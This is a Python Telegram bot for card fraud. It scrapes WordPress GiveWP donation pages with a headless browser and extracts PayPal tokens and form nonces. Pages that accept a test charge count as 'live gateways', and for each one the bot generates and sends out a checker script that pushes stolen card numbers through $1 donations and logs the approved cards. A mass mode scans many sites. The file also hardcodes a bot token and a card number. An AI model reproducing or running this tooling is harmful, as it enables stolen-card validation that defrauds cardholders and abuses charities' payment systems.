#!/usr/bin/env python3
"""GiveWP Bot v35 — Ultimate Production Edition"""
import telebot
import time
import threading
from telebot import types
import requests, random, json, string, re, base64
from datetime import datetime, timedelta
import os
import html
import uuid
import asyncio
import urllib3
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from playwright.async_api import async_playwright
    HAS_PW = True
except ImportError:
    HAS_PW = False
    print("⚠️ Playwright not installed")

try:
    from fake_useragent import UserAgent
    uu = UserAgent()
    HAS_FAKE_UA = True
except:
    HAS_FAKE_UA = False
    class SimpleUA:
        def __init__(self):
            self.agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            ]
        @property
        def random(self):
            return random.choice(self.agents)

token = '8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                return bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=None):
    for i in range(retries):
        try:
            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

# === أضخم قائمة استجابات PayPal الشاملة ===
PAYPAL_RESPONSES = [
    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION',
    'PAYER_ACCOUNT_RESTRICTED', 'PAYER_ACCOUNT_INVALID',
    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'METHOD_NOT_ALLOWED',
    'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
    'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
]

DEAD_RESPONSES = [
    'invalid_client', 'Client Authentication failed', 'invalid_grant',
    'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
    'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
    'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
]

class HybridExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.minimum_amount = "1.00"
        self.url = urlparse(target_url).netloc
        self.inurl = urlparse(target_url).path
        if urlparse(target_url).query:
            self.inurl += f"?{urlparse(target_url).query}"
        self.email = f"DRGAM{random.randint(100,999)}@gmail.com"

    async def extract_async(self):
        if not HAS_PW:
            return self._fallback_requests()

        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                )
                try:
                    ctx = await browser.new_context(
                        user_agent=uu.random if HAS_FAKE_UA else SimpleUA().random,
                        viewport={"width": 1366, "height": 900},
                        ignore_https_errors=True,
                    )
                    page = await ctx.new_page()
                    try:
                        await page.goto(self.target_url, wait_until="networkidle", timeout=15000)
                    except:
                        try:
                            await page.goto(self.target_url, wait_until="commit", timeout=10000)
                        except:
                            pass

                    await asyncio.sleep(1.5)
                    html = await page.content()

                    if 'give-form-id-prefix' not in html:
                        for frame in page.frames:
                            try:
                                fhtml = await frame.content()
                                if 'give-form-id-prefix' in fhtml:
                                    html = fhtml
                                    break
                            except:
                                continue

                    cookies_list = await ctx.cookies()
                    self.cookies = {c['name']: c['value'] for c in cookies_list}
                    self._parse_html(html)
                    return True
                finally:
                    await browser.close()
        except Exception as e:
            return self._fallback_requests()

    def _fallback_requests(self):
        try:
            r = requests.get(self.target_url, headers={'user-agent': SimpleUA().random}, timeout=15, verify=False)
            self.cookies = dict(r.cookies)
            self._parse_html(r.text)
            return True
        except:
            return False

    def _parse_html(self, html):
        try:
            id_form1 = re.search(r'name="give-form-id-prefix"\s*value="(.*?)"', html).group(1)
        except: id_form1 = ''
        try:
            id_form2 = re.search(r'name="give-form-id"\s*value="(.*?)"', html).group(1)
        except: id_form2 = ''
        try:
            nonec = re.search(r'name="give-form-hash"\s*value="(.*?)"', html).group(1)
        except: nonec = ''

        # استخراج الحد الأدنى للتبرع تلقائياً لمنع أي رفض
        try:
            min_m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
            if min_m and min_m.group(1).strip():
                float(min_m.group(1))
                self.minimum_amount = min_m.group(1)
        except:
            pass

        self.form_data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': self.target_url,
            'give-form-url': self.target_url,
            'give-form-minimum': self.minimum_amount,
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': self.minimum_amount,
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'DRGAM',
            'give_last': 'Bot',
            'give_email': self.email,
            'card_name': 'drgam',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
        }

        try:
            enc = re.search(r'"data-client-token":"(.*?)"', html).group(1)
            dec = base64.b64decode(enc + '=' * (-len(enc) % 4)).decode('utf-8', errors='ignore')
            self.access_token = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            self.client_token = enc
        except:
            pass

        for p in [r'client-id=["\']([^"\']+)["\']', r'"clientId"\s*:\s*"([^"]+)"', r'data-client-id=["\']([^"\']+)["\']']:
            m = re.search(p, html, re.IGNORECASE)
            if m:
                self.client_id = m.group(1)
                break

        self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'

class PayPalLinkTester:
    def __init__(self, extractor):
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent() if HAS_FAKE_UA else SimpleUA()
        self.client_id = extractor.client_id
        self.access_token = extractor.access_token
        self.client_token = extractor.client_token
        self.form_data = extractor.form_data
        self.ajax_url = extractor.ajax_url
        self.cookies = extractor.cookies
        self.url = extractor.url
        self.inurl = extractor.inurl
        self.donation = extractor.minimum_amount

    def Charge(self, ccx):
        try:
            if not self.ajax_url or not self.form_data.get('give-form-id'):
                return "No form fields"

            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            
            expiry = f"20{yy}-{mm}"
            order_id = self._create_order()
            if not order_id:
                return "Create Order Failed"

            auth_tokens = [t for t in [self.client_token, self.access_token, self.client_id] if t]
            confirm_json = {}
            for auth_token in auth_tokens:
                he4 = {
                    'authorization': f'Bearer {auth_token}',
                    'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }
                da3 = {
                    'payment_source': {
                        'card': {
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                        }
                    },
                    'application_context': {'vault': False},
                }
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                        headers=he4, json=da3, timeout=15
                    )
                    if confirm_res.status_code == 200:
                        confirm_json = confirm_res.json()
                        break
                except:
                    continue

            if isinstance(confirm_json, dict):
                confirm_str = str(confirm_json).upper()
                if 'INSUFFICIENT_FUNDS' in confirm_str:
                    return "INSUFFICIENT_FUNDS"
                if 'ORDER_NOT_APPROVED' in confirm_str or 'PAYER CANNOT PAY' in confirm_str:
                    return "Payer cannot pay for this transaction."

            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            return self._clean_response(text)
        except Exception as e:
            return f"Error: {e}"

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        text_upper = text.upper()
        text_lower = text.lower()
        if 'true' in text_lower or 'charge 1' in text_lower or 'success' in text_lower or 'completed' in text_lower:
            return "CHARGE 1.0"
        if 'insufficient' in text_lower:
            return "INSUFFICIENT_FUNDS"
        if 'order_not_approved' in text_lower or 'payer cannot pay' in text_lower:
            return "Payer cannot pay for this transaction."
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in text_lower:
                return pr
        return text[:80]

    def _create_order(self):
        try:
            form_data = self.form_data.copy()
            form_data['give-amount'] = self.donation
            multipart_data = MultipartEncoder({k: (None, v) for k, v in form_data.items()})
            headers = {
                'user-agent': self.uu.random,
                'origin': f'https://{self.url}',
                'referer': f'https://{self.url}{self.inurl}',
                'x-requested-with': 'XMLHttpRequest',
                'content-type': multipart_data.content_type,
            }
            params = {'action': 'give_paypal_commerce_create_order'}
            response = self.r.post(self.ajax_url, params=params, cookies=self.cookies, headers=headers, data=multipart_data, timeout=15)
            if response.status_code == 200 and response.text:
                json_data = response.json()
                if 'data' in json_data:
                    if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                        return json_data['data']['id']
                    elif isinstance(json_data['data'], str):
                        return json_data['data']
                if 'id' in json_data:
                    return json_data['id']
        except:
            pass
        return None

    def _approve_order(self, order_id):
        try:
            form_data = self.form_data.copy()
            form_data['give-amount'] = self.donation
            multipart_data = MultipartEncoder({k: (None, v) for k, v in form_data.items()})
            headers = {
                'user-agent': self.uu.random,
                'origin': f'https://{self.url}',
                'referer': f'https://{self.url}{self.inurl}',
                'x-requested-with': 'XMLHttpRequest',
                'content-type': multipart_data.content_type,
            }
            params = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
            return self.r.post(self.ajax_url, params=params, cookies=self.cookies, headers=headers, data=multipart_data, timeout=15)
        except:
            return None

def run_extractor(link):
    extractor = HybridExtractor(link)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(extractor.extract_async())
    finally:
        loop.close()
    return extractor

@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(massege.from_user.id) in blocked:
        safe_send_message(massege.chat.id, 'The admin has blocked you.')
        return

    ko = safe_send_message(massege.chat.id, "- Opening browser & extracting session tokens...")
    if not ko:
        return
    
    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(massege.chat.id, ko.message_id, '- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>')
            return

        link = parts[1].strip()
        if not link.startswith(("http://", "https://")):
            safe_edit_message(massege.chat.id, ko.message_id, "Invalid link format ❌")
            return

        extractor = run_extractor(link)
        if not extractor.form_data.get('give-form-id'):
            safe_edit_message(massege.chat.id, ko.message_id, "Failed to extract gateway form fields ❌")
            return

        safe_edit_message(massege.chat.id, ko.message_id, "Testing payment gateway...")
        tester = PayPalLinkTester(extractor)
        result = tester.Charge('4059986126444431|11|30|947')
        
        is_live = False
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break
        
        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
                return
        
        if not is_live:
            safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
            return

        file_name = f'gateway_{int(time.time())}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(f'''import requests, re, random, time, base64, uuid
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["DRGAM", "John", "Robert", "Michael", "William"]
        self.last_name = ["Rights", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "{extractor.minimum_amount}"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = "{extractor.client_id or ''}"
        self.access_token = "{extractor.access_token or ''}"
        self.client_token = "{extractor.client_token or ''}"
        self.form_data = {extractor.form_data}
        self.ajax_url = "{extractor.ajax_url or ''}"
        self.cookies = {extractor.cookies}
        self.url = "{extractor.url}"
        self.inurl = "{extractor.inurl}"

    def Charge(self, ccx):
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            
            expiry = f"20{{yy}}-{{mm}}"
            order_id = self._create_order()
            if not order_id:
                return "Create Order Failed"
            
            auth_tokens = [t for t in [self.client_token, self.access_token, self.client_id] if t]
            confirm_json = {{}}
            for auth_token in auth_tokens:
                he4 = {{
                    'authorization': f'Bearer {{auth_token}}',
                    'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }}
                da3 = {{
                    'payment_source': {{
                        'card': {{
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                        }}
                    }},
                    'application_context': {{'vault': False}},
                }}
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                        headers=he4, json=da3, timeout=15
                    )
                    if confirm_res.status_code == 200:
                        confirm_json = confirm_res.json()
                        break
                except:
                    continue
            
            if isinstance(confirm_json, dict):
                confirm_str = str(confirm_json).upper()
                if 'INSUFFICIENT_FUNDS' in confirm_str:
                    return "INSUFFICIENT_FUNDS"
                if 'ORDER_NOT_APPROVED' in confirm_str or 'PAYER CANNOT PAY' in confirm_str:
                    return "Payer cannot pay for this transaction."
            
            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            return self._clean_response(text)
        except Exception as e:
            return f"Error: {{e}}"

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        text_upper = text.upper()
        text_lower = text.lower()
        if 'true' in text_lower or 'charge 1' in text_lower or 'success' in text_lower:
            return "CHARGE 1.0"
        if 'insufficient' in text_lower:
            return "INSUFFICIENT_FUNDS"
        if 'order_not_approved' in text_lower or 'payer cannot pay' in text_lower:
            return "Payer cannot pay for this transaction."
        return text[:80]

    def _create_order(self):
        try:
            form_data = self.form_data.copy()
            form_data['give-amount'] = self.donation
            multipart_data = MultipartEncoder({{k: (None, v) for k, v in form_data.items()}})
            headers = {{
                'user-agent': self.uu.random,
                'origin': f'https://{{self.url}}',
                'referer': f'https://{{self.url}}{{self.inurl}}',
                'x-requested-with': 'XMLHttpRequest',
                'content-type': multipart_data.content_type,
            }}
            params = {{'action': 'give_paypal_commerce_create_order'}}
            response = self.r.post(self.ajax_url, params=params, cookies=self.cookies, headers=headers, data=multipart_data, timeout=15)
            if response.status_code == 200 and response.text:
                json_data = response.json()
                if 'data' in json_data:
                    if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                        return json_data['data']['id']
                    elif isinstance(json_data['data'], str):
                        return json_data['data']
                if 'id' in json_data:
                    return json_data['id']
        except:
            pass
        return None

    def _approve_order(self, order_id):
        try:
            form_data = self.form_data.copy()
            form_data['give-amount'] = self.donation
            multipart_data = MultipartEncoder({{k: (None, v) for k, v in form_data.items()}})
            headers = {{
                'user-agent': self.uu.random,
                'origin': f'https://{{self.url}}',
                'referer': f'https://{{self.url}}{{self.inurl}}',
                'x-requested-with': 'XMLHttpRequest',
                'content-type': multipart_data.content_type,
            }}
            params = {{'action': 'give_paypal_commerce_approve_order', 'order': order_id}}
            return self.r.post(self.ajax_url, params=params, cookies=self.cookies, headers=headers, data=multipart_data, timeout=15)
        except:
            return None

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Checker {{Getat}}')
    Br = input('Enter Number (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}\\n')
            print('Response: ' + resulti)
            time.sleep(5)
''')
        
        safe_send_document(massege.chat.id, file_name, caption=f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @I_PNP''')
        os.remove(file_name)

    except Exception as e:
        safe_edit_message(massege.chat.id, ko.message_id, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return
    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)

@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 Stopping...")
    else:
        safe_send_message(message.chat.id, "❌ No active process.")

def check_single_link(link):
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
        
        extractor = run_extractor(link)
        if not extractor.form_data.get('give-form-id'):
            return {'link': link, 'live': False, 'respons': 'No form fields'}

        tester = PayPalLinkTester(extractor)
        result = tester.Charge('4059986126444431|11|30|947')
        
        is_live = False
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break
        
        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                return {'link': link, 'live': False, 'respons': result}
        
        if is_live:
            return {
                'link': link, 'live': True, 'respons': result,
                'extractor': extractor
            }
        return {'link': link, 'live': False, 'respons': result}
    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100]}

def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ Please send a .txt file.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            safe_send_message(message.chat.id, "❌ File is empty.")
            return

        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False
        }
        
        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: 0\n❌ Dead: 0\n⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░\nUrl : ...\nRespons : ...\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked 0 of {total}\n🛑 /stop to stop""")
        if not status_msg:
            return

        def update_status():
            last_text = ""
            while True:
                time.sleep(5)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False):
                            break
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        current_url = processing_status[user_id]['current_url']
                        current_respons = processing_status[user_id]['current_respons']
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        text = f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: {live}\n❌ Dead: {dead}\n⏳ Progress: {percent}% {bar}\nUrl : <code>{current_url[:50] if current_url else '...'}</code>\nRespons : <code>{current_respons[:50] if current_respons else '...'}</code>\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked {processed} of {total}\n🛑 /stop to stop"""
                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except:
                                pass
                except:
                    pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()
        time.sleep(1)

        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False):
                break
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Extracting & Testing...'
            
            result = check_single_link(link)
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                resp_text = result.get('respons', 'Dead')
                processing_status[user_id]['current_respons'] = resp_text

                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    ext = result['extractor']
                    
                    try:
                        code = f'''import requests, re, random, time, base64, uuid
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["DRGAM", "John", "Robert", "Michael", "William"]
        self.last_name = ["Rights", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "{ext.minimum_amount}"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = "{ext.client_id or ''}"
        self.access_token = "{ext.access_token or ''}"
        self.client_token = "{ext.client_token or ''}"
        self.form_data = {ext.form_data}
        self.ajax_url = "{ext.ajax_url or ''}"
        self.cookies = {ext.cookies}
        self.url = "{ext.url}"
        self.inurl = "{ext.inurl}"

    def Charge(self, ccx):
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            
            expiry = f"20{{yy}}-{{mm}}"
            order_id = self._create_order()
            if not order_id:
                return "Create Order Failed"
            
            auth_tokens = [t for t in [self.client_token, self.access_token, self.client_id] if t]
            confirm_json = {{}}
            for auth_token in auth_tokens:
                he4 = {{
                    'authorization': f'Bearer {{auth_token}}',
                    'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }}
                da3 = {{
                    'payment_source': {{
                        'card': {{
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                        }}
                    }},
                    'application_context': {{'vault': False}},
                }}
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                        headers=he4, json=da3, timeout=15
                    )
                    if confirm_res.status_code == 200:
                        confirm_json = confirm_res.json()
                        break
                except:
                    continue
            
            if isinstance(confirm_json, dict):
                confirm_str = str(confirm_json).upper()
                if 'INSUFFICIENT_FUNDS' in confirm_str:
                    return "INSUFFICIENT_FUNDS"
                if 'ORDER_NOT_APPROVED' in confirm_str or 'PAYER CANNOT PAY' in confirm_str:
                    return "Payer cannot pay for this transaction."
            
            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            return self._clean_response(text)
        except Exception as e:
            return f"Error: {{e}}"

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        text_upper = text.upper()
        text_lower = text.lower()
        if 'true' in text_lower or 'charge 1' in text_lower or 'success' in text_lower:
            return "CHARGE 1.0"
        if 'insufficient' in text_lower:
            return "INSUFFICIENT_FUNDS"
        if 'order_not_approved' in text_lower or 'payer cannot pay' in text_lower:
            return "Payer cannot pay for this transaction."
        return text[:80]

    def _create_order(self):
        try:
            form_data = self.form_data.copy()
            form_data['give-amount'] = self.donation
            multipart_data = MultipartEncoder({{k: (None, v) for k, v in form_data.items()}})
            headers = {{
                'user-agent': self.uu.random,
                'origin': f'https://{{self.url}}',
                'referer': f'https://{{self.url}}{{self.inurl}}',
                'x-requested-with': 'XMLHttpRequest',
                'content-type': multipart_data.content_type,
            }}
            params = {{'action': 'give_paypal_commerce_create_order'}}
            response = self.r.post(self.ajax_url, params=params, cookies=self.cookies, headers=headers, data=multipart_data, timeout=15)
            if response.status_code == 200 and response.text:
                json_data = response.json()
                if 'data' in json_data:
                    if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                        return json_data['data']['id']
                    elif isinstance(json_data['data'], str):
                        return json_data['data']
                if 'id' in json_data:
                    return json_data['id']
        except:
            pass
        return None

    def _approve_order(self, order_id):
        try:
            form_data = self.form_data.copy()
            form_data['give-amount'] = self.donation
            multipart_data = MultipartEncoder({{k: (None, v) for k, v in form_data.items()}})
            headers = {{
                'user-agent': self.uu.random,
                'origin': f'https://{{self.url}}',
                'referer': f'https://{{self.url}}{{self.inurl}}',
                'x-requested-with': 'XMLHttpRequest',
                'content-type': multipart_data.content_type,
            }}
            params = {{'action': 'give_paypal_commerce_approve_order', 'order': order_id}}
            return self.r.post(self.ajax_url, params=params, cookies=self.cookies, headers=headers, data=multipart_data, timeout=15)
        except:
            return None

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Checker {{Getat}}')
    Br = input('Enter Number (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}\\n')
            print('Response: ' + resulti)
            time.sleep(5)
'''''
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{resp_text}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @I_PNP""")
                        os.remove(file_name)
                    except Exception as e:
                        print(f"Error sending file: {e}")
                else:
                    processing_status[user_id]['dead'] += 1

        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        
        updater.join(timeout=2)
